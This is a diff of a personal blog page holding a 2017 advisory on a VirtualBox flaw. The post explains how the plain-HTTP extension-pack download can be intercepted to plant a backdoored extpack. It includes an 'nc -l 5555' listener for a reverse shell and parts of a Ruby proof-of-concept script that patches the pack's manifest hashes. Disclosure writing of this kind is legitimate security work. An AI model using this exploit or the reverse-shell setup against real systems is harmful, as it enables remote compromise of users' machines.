@@ -13,7 +13,7 @@
         <div id="menu">
                         <h3>Mark Wadham</h3>
             <ul>
-                <li><a href="/index.html">profile</a></li>
+                <li><a href="/">profile</a></li>
                 <li><a href="/blog.html">blog</a> <a href="/blog/rss"><img src="/img/rss.png" /></a></li>
                 <li><a href="/cves.html">CVEs</a></li>
                 <li><a href="/jsdemos.html">js demos</a></li>
@@ -23,44 +23,45 @@
                 <li class="small">linkedin: <a href="https://uk.linkedin.com/in/mark-wadham-14ab49a6">379069834</a></li>
                 <li class="red space small"></li>
             </ul>
-
         </div>
         <div id="content">
             <div id="main-content">
-                                            <div class="post">
+                            
+                            <div class="post">
                 <h2><a href="/blog/owning-virtualbox-via-mitm.html">Owning VirtualBox via MITM</a></h2>
                 <h3>30 Nov 2017 08:25  | <a class="tag" href="/blog/tag/macOS.html">macOS</a> | <a class="tag" href="/blog/tag/security.html">security</a></h3>
+                
                   <pre>VirtualBox is a virtualisation application written by Oracle that is quite popular
-presumably because its free. I&#39;m not a fan myself - if my mac locks up
-completely or kernel panics it&#39;s usually because I&#39;ve loaded the vbox kernel
+presumably because its free. I&#x27;m not a fan myself - if my mac locks up
+completely or kernel panics it&#x27;s usually because I&#x27;ve loaded the vbox kernel
 extensions less than 10 minutes ago. I use VMware Fusion instead (which is fairly
-expensive but IMO worth the money) and have a ritual whereby if I&#39;ve had to load
+expensive but IMO worth the money) and have a ritual whereby if I&#x27;ve had to load
 the vbox kernel extensions for work-related reasons I will reboot the machine
 before doing anything else.
 
-I discovered back in May that if certain conditions are met it&#39;s possible to
-achieve RCE in the VirtualBox application if you can MITM a user&#39;s traffic. This
+I discovered back in May that if certain conditions are met it&#x27;s possible to
+achieve RCE in the VirtualBox application if you can MITM a user&#x27;s traffic. This
 is possible because, bizarrely, VirtualBox downloads updates over plain http:
 
-<img src="https://m4.rkw.io/img/vbox_nossl.png" />
+https://m4.rkw.io/img/vbox_nossl.png
 
 This is true for both the pkg installer (which carries an Apple Developer code
 signature, making tampering with it tricky) and also for the multi-architecture
 extension pack, which has no code signature.
 
-<img src="https://m4.rkw.io/img/vbox_nossl2.png" />
+https://m4.rkw.io/img/vbox_nossl2.png
 
-Despite reporting this to Oracle nearly 7 months ago they still haven&#39;t managed
+Despite reporting this to Oracle nearly 7 months ago they still haven&#x27;t managed
 to put an SSL certificate on the download site. Hopefully this advisory will
 make people aware of the issue and encourage them to manually verify the
-checksum of the extension pack should they be in a situation where they&#39;ve
+checksum of the extension pack should they be in a situation where they&#x27;ve
 downloaded it manually.
 
 Little Snitch shows that vbox does talk to update.virtualbox.org over https to
 retrieve the version information, but the extension pack itself is downloaded
 over http.
 
-<img src="https://m4.rkw.io/img/vbox_ls.png" />
+https://m4.rkw.io/img/vbox_ls.png
 
 The extension pack for macOS is a gzipped tarball containing these files:
 
@@ -139,28 +140,28 @@ sha256 hash check.
 The update process for vbox is:
 
 1) Older version (eg 5.1.20) is launched, the user is prompted to download the
-newest version.  The link provided here is <a href="http:// so this alone could be">http:// so this alone could be</a>
+newest version.  The link provided here is http:// so this alone could be
 intercepted and modified, but it would require a developer cert to sign a new
 pkg bundle for the user to install.
 
 2) After installing the new version, on the next launch it will prompt the user
 to install the new extpack for 5.1.22.  The API call to update.virtualbox.org
-happens over SSL so we can&#39;t mess with the version numbers or the hashes that
+happens over SSL so we can&#x27;t mess with the version numbers or the hashes that
 correspond to the new extpack.
 
 Now if we MITM the request to download.virtualbox.org and send our hacked
 extpack, VirtualBox says:
 
-<img src="https://m4.rkw.io/img/vbox_reject.png" />
+https://m4.rkw.io/img/vbox_reject.png
 
-So it&#39;s telling us to download it manually from the website.  A user seeing
-this probably wouldn&#39;t suspect anything other than an Oracle mishap so they
+So it&#x27;s telling us to download it manually from the website.  A user seeing
+this probably wouldn&#x27;t suspect anything other than an Oracle mishap so they
 would likely hop over to virtualbox.org to download the extpack manually. The
 website does say &quot;check the hashes&quot; and provides SHA256 and MD5 checksums (which
 are served over SSL).
 
 The website www.virtualbox.org is served over SSL.. but the download link for
-the extension pack points to download.virtualbox.org over <a href="http://. This is bad">http://. This is bad</a>
+the extension pack points to download.virtualbox.org over http://. This is bad
 because it means we can leave www.virtualbox.org un-messed-with so the user sees
 the SSL load correctly (and is lulled into a false sense of security because of
 the SSL padlock), but still MITM download.virtualbox.org in order to send our
@@ -168,9 +169,9 @@ hacked payload.
 
 The filename for the extpack as its linked on the website is slightly different
 to the one requested by the application but we can still intercept it, and since
-it was downloaded manually vbox doesn&#39;t verify the signature and just merrily
+it was downloaded manually vbox doesn&#x27;t verify the signature and just merrily
 installs it, allowing us to compromise the host.  Of course if a user is
-paranoid enough to check the hashes then they&#39;ll notice something is wrong, but
+paranoid enough to check the hashes then they&#x27;ll notice something is wrong, but
 how many users are realistically going to do that?
 
 Amusingly, on installation it warns you to only install extension packs that you
@@ -180,10 +181,10 @@ vendor THAT HAS ITS OWN CERTIFICATE AUTHORITY that you just loaded over SSL?
 As soon as any VM is started the code in our malicious dylib gets executed as
 the user running VirtualBox on the host machine.
 
-Obviously this will only work if the user doesn&#39;t have the latest version, as
+Obviously this will only work if the user doesn&#x27;t have the latest version, as
 otherwise there would be no reason for them to download an extpack. However vbox
 updates are fairly frequent so an attacker waiting around with MITM capability
-probably wouldn&#39;t have to wait too long before being able to execute this
+probably wouldn&#x27;t have to wait too long before being able to execute this
 attack.
 
 The PoC code below downloads the latest extension pack from the VirtualBox
@@ -197,7 +198,7 @@ $ nc -l 5555
 
 and then start any vm.
 
-<a href="https://m4.rkw.io/vbox_extpack_builder.rb.txt">https://m4.rkw.io/vbox_extpack_builder.rb.txt</a>
+https://m4.rkw.io/vbox_extpack_builder.rb.txt
 6148d6aa7ad2896ae3679ed8e2ff46e7156fd9db9c9ef39fa4116c9566848606
 ----------------------------------------------------------------------------
 #!/usr/bin/env ruby
@@ -214,7 +215,7 @@ and then start any vm.
 #
 # Thanks to Jacob Hammack for the shellcode
 
-require &#39;digest&#39;
+require &#x27;digest&#x27;
 
 puts
 puts &quot;RCE PoC builder for VirtualBox extension pack&quot;
@@ -299,12 +300,12 @@ Dir.chdir(&quot;vbox_exp_temp&quot;)
 
 puts &quot;looking for latest extpack at virtualbox.org...&quot;
 
-downloads_html = `curl -s <a href="https://www.virtualbox.org/wiki/Downloads">https://www.virtualbox.org/wiki/Downloads</a>`
+downloads_html = `curl -s https://www.virtualbox.org/wiki/Downloads`
 
 match = downloads_html.match(/http:\/\/download\.virtualbox\.org\/virtualbox\/[\d\.]+\/Oracle_VM_VirtualBox_Extension_Pack[\d\.\-]+\.vbox-extpack/)
 
 if !match or !match[0]
-  puts &quot;failed to find <a href="http:// link to the extpack.&quot">http:// link to the extpack.&quot</a>;
+  puts &quot;failed to find http:// link to the extpack.&quot;
   exit 1
 end
 
@@ -328,7 +329,7 @@ puts &quot;patching manifest... &quot;
 
 File.open(&quot;ExtPack.manifest.new&quot;,&quot;w&quot;) do |f|
   File.read(&quot;ExtPack.manifest&quot;).chomp.split(&quot;\n&quot;).each do |line|
-    r = target_dylib.gsub(&#39;.&#39;,&#39;\.&#39;)
+    r = target_dylib.gsub(&#x27;.&#x27;,&#x27;\.&#x27;)
 
     if (match = line.match(/\A(MD5|SHA256|SHA512|SHA1|SIZE) \(darwin\.amd64\/#{r}\)/))
       case match[1]
@@ -363,10 +364,11 @@ system(&quot;tar -zcf ../#{filename} *&quot;)
 Dir.chdir(&quot;..&quot;)
 system(&quot;rm -rf vbox_exp_temp&quot;)
 
-puts &quot;\ncreated backdoored extpack: #{filename}\n\n&quot;</pre>
+puts &quot;\ncreated backdoored extpack: #{filename}\n\n&quot;
+</pre>
+                
             </div>
-
-
+            
             </div>
             <div id="right-content">
                 
@@ -376,39 +378,67 @@ puts &quot;\ncreated backdoored extpack: #{filename}\n\n&quot;</pre>
 
             <ul>
               <li>&nbsp;&nbsp;[year]</li>
+              
                 <li>&nbsp;&nbsp;<a href="/blog/2022.html">2022</a></li>
+              
                 <li>&nbsp;&nbsp;<a href="/blog/2021.html">2021</a></li>
+              
                 <li>&nbsp;&nbsp;<a href="/blog/2020.html">2020</a></li>
+              
                 <li>&nbsp;&nbsp;<a href="/blog/2019.html">2019</a></li>
+              
                 <li>&nbsp;&nbsp;<a href="/blog/2018.html">2018</a></li>
+              
                 <li>&nbsp;&nbsp;<a href="/blog/2017.html">2017</a></li>
+              
                 <li>&nbsp;&nbsp;<a href="/blog/2016.html">2016</a></li>
+              
                 <li>&nbsp;&nbsp;<a href="/blog/2015.html">2015</a></li>
+              
             </ul>
 
             <ul>
               <li>&nbsp;&nbsp;[tag]</li>
+              
                 <li>&nbsp;&nbsp;<a href="/blog/tag/AWS.html">AWS</a></li>
+              
                 <li>&nbsp;&nbsp;<a href="/blog/tag/agile.html">agile</a></li>
+              
                 <li>&nbsp;&nbsp;<a href="/blog/tag/apple.html">apple</a></li>
+              
                 <li>&nbsp;&nbsp;<a href="/blog/tag/bash.html">bash</a></li>
+              
                 <li>&nbsp;&nbsp;<a href="/blog/tag/cryptocurrency.html">cryptocurrency</a></li>
+              
                 <li>&nbsp;&nbsp;<a href="/blog/tag/development.html">development</a></li>
+              
                 <li>&nbsp;&nbsp;<a href="/blog/tag/exploits.html">exploits</a></li>
+              
                 <li>&nbsp;&nbsp;<a href="/blog/tag/iOS.html">iOS</a></li>
+              
                 <li>&nbsp;&nbsp;<a href="/blog/tag/linux.html">linux</a></li>
+              
                 <li>&nbsp;&nbsp;<a href="/blog/tag/macOS.html">macOS</a></li>
+              
                 <li>&nbsp;&nbsp;<a href="/blog/tag/mining.html">mining</a></li>
+              
                 <li>&nbsp;&nbsp;<a href="/blog/tag/mysql.html">mysql</a></li>
+              
                 <li>&nbsp;&nbsp;<a href="/blog/tag/php.html">php</a></li>
+              
                 <li>&nbsp;&nbsp;<a href="/blog/tag/ruby.html">ruby</a></li>
+              
                 <li>&nbsp;&nbsp;<a href="/blog/tag/scrum.html">scrum</a></li>
+              
                 <li>&nbsp;&nbsp;<a href="/blog/tag/security.html">security</a></li>
+              
                 <li>&nbsp;&nbsp;<a href="/blog/tag/touchID.html">touchID</a></li>
+              
                 <li>&nbsp;&nbsp;<a href="/blog/tag/vim.html">vim</a></li>
+              
                 <li>&nbsp;&nbsp;<a href="/blog/tag/work.html">work</a></li>
+              
             </ul>
-
             </div>
         </div>
 				<script>
